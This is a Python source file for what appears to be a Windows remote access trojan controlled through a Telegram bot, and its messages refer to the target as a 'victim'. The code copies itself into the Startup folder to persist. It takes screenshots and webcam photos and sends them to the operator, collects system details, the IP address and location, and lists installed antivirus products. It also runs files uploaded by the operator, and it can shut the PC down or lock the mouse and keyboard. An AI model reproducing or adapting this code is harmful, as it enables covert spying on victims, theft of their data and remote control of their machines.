import telebot
from PIL import ImageGrab
import pyautogui as p
import getpass
import os
import os.path
import sys
import json
import win32api
import platform
import psutil
import GPUtil
import requests
import time
import cv2
from pytube import YouTube
import webbrowser
import threading
import random
from win32com.client import Dispatch
import pyttsx3

Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя

target_dir = os.path.join(user_path, 'AppData', 'Roaming', 'SystemDx')

if not os.path.exists(target_dir):
    os.makedirs(target_dir)

TOKEN = 'YOUR TOKEN'

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

try:
    bot = telebot.TeleBot(TOKEN)

    users = [ID USERS]

    engine = pyttsx3.init()

    USER_NAME = getpass.getuser()

    @bot.message_handler(func=lambda message: message.chat.id not in users)
    def some(message):
        bot.send_message(message.chat.id, 'Не ваше дело сюда лесть...')


    @bot.message_handler(commands=["start", "help"])
    def screen(message, res=False):
        try:
            bot.send_message(message.chat.id, """
                Мои команды:
                \n/screen - Скриншот
                \n/messageicon - окно в виде ошибки
                \n/antiviruses - Наличие антивирусов
                \n/pc_info - Данные о пк в том числе и IP
                \n/webp - Фото с веб камеры
                \n/open_link https://ссылка - Открывает ссылку в браузере и присылает скриншот
                \n/shutdown - Выключит пк
                \n/altf4 - Исполнит сочетание клавиш alf + f4
                \n/hidePG - Свернёт все окна (не везде работает)
                \n/volumePlus - Прибавит громкость
                \n/volumeMinus - Уменьшает громкость
                \n/system - Откровет любой файл с расширением
                \n/alldir - Показывает все файлы и директории
                \n/ClearWin - Вкладки очищаются через win + tab (не везде работает)
                \n/display180 - переворачивает экран на 180 (не везде работает)
                \n/displayNormal - переворачивает экран обратно после команды /display180 (не везде работает)
                \n/crazyMOUSE время сумашествия 1000 примерно 1 минута - Курсор сойдёт с ума
                \n/BlockMouse <Время в секундах> - блокирует мышь
                \n/BlockKeyboard <Время в секундах> - блокирует клавиатуру
                \n/VMessage - говорит в слух ваше сообщение
                \n/F11 - делает приложение на полный экран""")
        except Exception as e:
            bot.reply_to()

    @bot.message_handler(content_types=['audio'])
    def download_audio(message):
        try:
            audio_id = message.audio.file_id
            file_info = bot.get_file(audio_id)
            file_path = file_info.file_path
            file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"

            response = requests.get(file_url)

            filename = os.path.join(target_dir, f"audio.mp3")

            with open(filename, 'wb') as f:
                f.write(response.content)

            bot.reply_to(message, "Аудио успешно скачано на ПК!")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")

    @bot.message_handler(content_types=['video'])
    def download_video(message):
        try:
            video_id = message.video.file_id
            file_info = bot.get_file(video_id)
            file_path = file_info.file_path
            file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"


            response = requests.get(file_url)

            filename = os.path.join(target_dir, f"video.mp4")

            with open(filename, 'wb') as f:
                f.write(response.content)

            bot.reply_to(message, "Видео успешно скачано")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")

    @bot.message_handler(content_types=['document'])
    def handle_docs_photo(message):
        try:
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            chat_id = message.chat.id

            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            user_path = os.path.expanduser('~')
            target_dir = os.path.join(user_path, 'AppData', 'Roaming', 'SystemDx')

            if not os.path.exists(target_dir):
                os.makedirs(target_dir)

            filename = os.path.join(target_dir, message.document.file_name)

            with open(filename, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.reply_to(message, "Файл успешно сохранён в папку SystemDx!")
        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")

    @bot.message_handler(commands=['crazyMOUSE'])
    def video(message, res=True):
        try:
            text = ' '.join([str(elem) for elem in message.text.split()])
            text1 = text.replace('/crazyMOUSE ', '')
            time = int(text1)
            bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
            for x in range(1,time):
                p.moveTo(random.randint(0,500),random.randint(0,500))
            bot.reply_to(message, 'Успешно!')
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['F11'])
    def video(message, res=True):
        try:
            p.hotkey('f11')
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            bot.send_photo(message.chat.id,f)
            try:
                os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming' + '\\sreenshot.jpg')
            except Exception as e:
                pass
            bot.reply_to(message, 'Успешно!')
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['BlockMouse'])
    def mouse(message, res=True):
        try:
            try:
                seconds = int(message.text.split(maxsplit=1)[1])
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                screen_width, screen_height = p.size()
                x = screen_width // 2
                y = screen_height // 2
                p.moveTo(x, y)
                p.mouseDown(x, y)
                time.sleep(seconds)
                p.mouseUp()
                bot.reply_to(message, 'Успешно!')
            except IndexError:
                bot.reply_to(message, "Пожалуйста, укажите время после команды /BlockMouse")
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['BlockKeyboard'])
    def mouse(message, res=True):
        try:
            try:
                seconds = int(message.text.split(maxsplit=1)[1])
                bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.')
                original_layout = p.keyboardLayout()
                p.KEYBOARD_KEYS = {}
                time.sleep(seconds)
                p.KEYBOARD_KEYS = original_layout
                bot.reply_to(message, 'Успешно!')
            except IndexError:
                bot.reply_to(message, "Пожалуйста, укажите время после команды /BlockKeyboard")
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['alldir'])
    def alldir(message):
        try:
            bot.send_message(message.chat.id, "Ожидайте моего следующего ответа")
            
            user_path = os.path.expanduser('~')
            target_dir = os.path.join(user_path, 'AppData', 'Roaming', 'SystemDx')

            files_info = []
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    file_name, file_extension = os.path.splitext(file)
                    files_info.append(f"File: {file_name}, Extension: {file_extension}")
                for dir in dirs:
                    files_info.append(f"Directory: {dir}")

            info_string = '\n'.join(files_info)

            bot.send_message(message.chat.id, info_string)
            bot.send_message(message.chat.id, "Все файлы и директории")

        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")

    @bot.message_handler(commands=["VMessage"])
    def send_message_to_client(message):
            msg = bot.send_message(message.chat.id, "Введите сообщение:")
            bot.register_next_step_handler(msg, vsms_to_client)

    def vsms_to_client(message):
            try:
                engine = pyttsx3.init()
                engine.say(message.text)
                engine.runAndWait()
            except Exception:
                bot.send_message(message.chat.id, "Что-то пошло не так...")

    @bot.message_handler(commands=['system'])
    def execute_file(message):
        try:
            command = message.text.split(maxsplit=1)[1]
            user_path = os.path.expanduser('~')
            target_dir = os.path.join(user_path, 'AppData', 'Roaming', 'SystemDx')

            file_path = os.path.join(target_dir, command)
            if os.path.exists(file_path):
                result = os.system(file_path)
                if result == 0:
                    bot.reply_to(message, "Файл успешно выполнен")
                else:
                    bot.reply_to(message, "Ошибка при выполнении файла")
            else:
                bot.reply_to(message, "Файл не найден в директории SystemDx")

        except IndexError:
            bot.reply_to(message, "Пожалуйста, укажите имя файла после команды /system")

        except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")

    @bot.message_handler(commands=['YTPlay'])
    def YTPlay(message, res=True):
        try:
            bot.send_message(message.chat.id, "Ожидайте моего следующего ответа")
            command_text = message.text

            command_parts = command_text.split()

            if len(command_parts) < 2:
                bot.send_message(message.chat.id, "Ошибка: Второй аргумент (ссылка на видео) отсутствует.")
                return

            video_url = command_parts[1]

            yt = YouTube(video_url)

            video = yt.streams.filter(progressive=True, file_extension='mp4').first()

            video.download()

            video_path = f"{yt.title}.mp4"
            p.hotkey('win','d')
            os.system(f'start "" /B /WAIT /MAX "{video_path}" -fullscreen')

            bot.send_message(message.chat.id, "Видео успешно проигралось :)")
            try:
                threading.Timer(20, lambda: os.remove(video_path)).start()
            except:
                pass

        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {e}")

    @bot.message_handler(commands=['volumePlus'])
    def video(message, res=True):
        try:
            try:
                if len(message.text.split()) > 1:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                    vlpl = int(message.text.split()[1])
                    if vlpl <= 0 or vlpl > 100:
                        bot.send_message(message.chat.id, "Ошибка: Неправильный формат")
                    else:
                        for x in range(vlpl):
                            p.hotkey('volumeup')
                        bot.reply_to(message, f'К звуку успешно было прибавлено {vlpl*2}')
                else:
                    bot.send_message(message.chat.id, "Ошибка: Неправильный формат")
            except ValueError:
                bot.send_message(message.chat.id, "Ошибка: Неправильный формат")
        except Exception as e:
            bot.reply_to(message, e)


    @bot.message_handler(commands=['volumeMinus'])
    def video(message, res=True):
        try:
            try:
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
                if len(message.text.split()) > 1:
                    vlpl = int(message.text.split()[1])
                    if vlpl <= 0 or vlpl > 100:
                        bot.send_message(message.chat.id, "Ошибка: Неправильный формат")
                    else:
                        for x in range(vlpl):
                            p.hotkey('volumedown')
                        bot.reply_to(message, f'От звука успешно было отнято {vlpl*2}')
                else:
                    bot.send_message(message.chat.id, "Ошибка: Неправильный формат")
            except ValueError:
                bot.send_message(message.chat.id, "Ошибка: Неправильный формат")
        except Exception as e:
            bot.reply_to(message, e)


    @bot.message_handler(commands=["open_link"])
    def screen(message, res=False):
        try:
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            webbrowser.open_new(message.text.split()[1])
            time.sleep(4)
            screen = ImageGrab.grab()
            screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
            f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
            bot.send_photo(message.chat.id,f)
            try:
                os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming' + '\\sreenshot.jpg')
            except Exception as e:
                pass
            bot.send_message(message.chat.id, 'Успешно открыта ссылка! Вот скриншот')
        except Exception as e:
            bot.send_message(message.chat.id, 'Не удалось открыть ссылку, используй такой формат: /open_link https://ссылка\nКод ошибки:\n' + str(e))

    @bot.message_handler(commands=['display180'])
    def video(message, res=True):
        try:
            bot.reply_to(message, 'Переворачиваю экран, дождитесь ответа')
            p.hotkey('win','d')
            os.system('control desk.cpl')
            time.sleep(2)
            for i in range(5):
                p.hotkey('tab')
                time.sleep(0.1)
            time.sleep(0.3)
            p.press('enter')
            time.sleep(0.1)
            p.hotkey('down')
            time.sleep(0.1)
            p.hotkey('down')
            time.sleep(0.1)
            p.press('enter')
            time.sleep(1)
            p.hotkey('tab')
            time.sleep(0.1)
            p.press('enter')
            time.sleep(0.5)
            p.hotkey('alt','f4')

        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['displayNormal'])
    def video(message, res=True):
        try:
            bot.reply_to(message, 'Переворачиваю экран, дождитесь ответа')
            p.hotkey('win','d')
            os.system('control desk.cpl')
            time.sleep(2)
            for i in range(5):
                p.hotkey('tab')
                time.sleep(0.1)
            time.sleep(0.3)
            p.press('enter')
            time.sleep(0.1)
            p.hotkey('up')
            time.sleep(0.1)
            p.hotkey('up')
            time.sleep(0.1)
            p.press('enter')
            time.sleep(1)
            p.hotkey('tab')
            time.sleep(0.1)
            p.press('enter')
            time.sleep(0.5)
            p.hotkey('alt','f4')

        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['shutdown'])
    def video(message, res=True):
        try:
            bot.reply_to(message, 'Выключаю пк...')
            os.system('shutdown /s /t 0')
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['altf4'])
    def video(message, res=True):
        try:
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            p.hotkey('alt','f4')
            bot.reply_to(message, 'Успешно!')
        except Exception as e:
            bot.reply_to(message, e)


    @bot.message_handler(commands=['hidePG'])
    def video(message, res=True):
        try:
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            p.hotkey('win','d')
            bot.reply_to(message, 'Успешно!')
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=['ClearWin'])
    def video(message, res=True):
        try:
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            p.hotkey('win','d')
            time.sleep(0.5)
            p.hotkey('win','tab')
            time.sleep(0.8)
            p.hotkey('tab')
            time.sleep(0.2)
            p.press('enter')
            time.sleep(0.2)
            p.press('esc')
            bot.reply_to(message, 'Успешно!')
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=["pc_info"])
    def pc_info(message, res=False):
        bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
        try:
            def get_size(bytes, suffix="B"):
                factor = 1024
                for unit in ["", "K", "M", "G", "T", "P"]:
                    if bytes < factor:
                        return f"{bytes:.2f}{unit}{suffix}"
                    bytes /= factor
            uname = platform.uname()

            namepc = "\nИмя пк: " + str(uname.node)
            countofcpu = psutil.cpu_count(logical=True)
            allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu) 

            cpufreq = psutil.cpu_freq()
            cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'


            svmem = psutil.virtual_memory()
            allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
            ramfree = "\nДоступно: " + str(get_size(svmem.available))
            ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

            partitions = psutil.disk_partitions()
            for partition in partitions:
                nameofdevice = "\nДиск: " + str(partition.device)
                nameofdick = "\nИмя диска: " + str(partition.mountpoint)
                typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:

                    continue
                allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
                usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
                freestorage = "\nСвободно: " + str(get_size(partition_usage.free))



            try:
                gpus = GPUtil.getGPUs()
                list_gpus = []
                for gpu in gpus:

                    gpu_name = "\nМодель видеокарты: " + gpu.name

                    gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

                    gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

                    gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
            except:
                bot.send_message(message.chat.id, 'Видеокарты нету либо она встроенная')

            headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            drives = str(win32api.GetLogicalDriveStrings())
            drives = str(drives.split('\000')[:-1])

            try:
                ip = requests.get('https://api.ipify.org').text
                urlloc = 'http://ip-api.com/json/'+ip
                location1 = requests.get(urlloc, headers=headers).text
            except:
                pass
            all_data = "Time: " + time.asctime() + '\n' + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
            bot.send_message(message.chat.id, all_data)
        except Exception as e:
            bot.reply_to(message, e)

    @bot.message_handler(commands=["screen"])
    def screen(message, res=False):
        bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
        screen = ImageGrab.grab()
        screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
        f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
        bot.send_photo(message.chat.id,f)
        try:
            os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\sreenshot.png')
        except:
            pass

    @bot.message_handler(commands=["webp"])
    def screen(message, res=False):
        try:
            bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
            cap = cv2.VideoCapture(0)
            for i in range(30):
                cap.read()
            ret, frame = cap.read()
            cv2.imwrite(os.getenv("APPDATA") + '\\4543t353454.png', frame)   
            cap.release()
            webcam = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png','rb')
            bot.send_photo(message.chat.id, webcam)
            try:
                os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png')
            except:
                pass
        except:
            bot.send_message(message.chat.id, 'У жертвы нету веб камеры.')

    @bot.message_handler(commands=["messageicon"])
    def send_message_to_client(message):
            msg = bot.send_message(message.chat.id, "Введите сообщение:")
            bot.register_next_step_handler(msg, sms_to_client)


    @bot.message_handler(commands=["antiviruses"])
    def antiviruses(message, res=False):
        bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета жертвы')
        Antiviruses = {
        'C:\\Program Files\\Windows Defender': 'Windows Defender',
        'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
        'C:\\Program Files\\AVG\\Antivirus': 'AVG',
        'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
        'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
        'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
        'C:\\Program Files\\DrWeb': 'Dr.Web',
        'C:\\Program Files\\ESET\\ESET Security': 'ESET',
        'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
        'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
        'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
        }
        Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
        AntivirusesAll = json.dumps(Antivirus)
        bot.send_message(message.chat.id, AntivirusesAll)

    def sms_to_client(message):
            try:
                p.alert(message.text, "Ошибка")
            except Exception:
                bot.send_message(message.chat.id, "Что-то пошло не так...")

    @bot.message_handler(content_types=['text'])
    def hello(message, res=False):
        try:
            bot.reply_to(message, 'Чувак я не знаю что ответить на это, используй /help Для получения списка моих команд')
        except Exception as e:
            bot.reply_to(message, e)   


    bot.infinity_polling()
except:
        pass
    
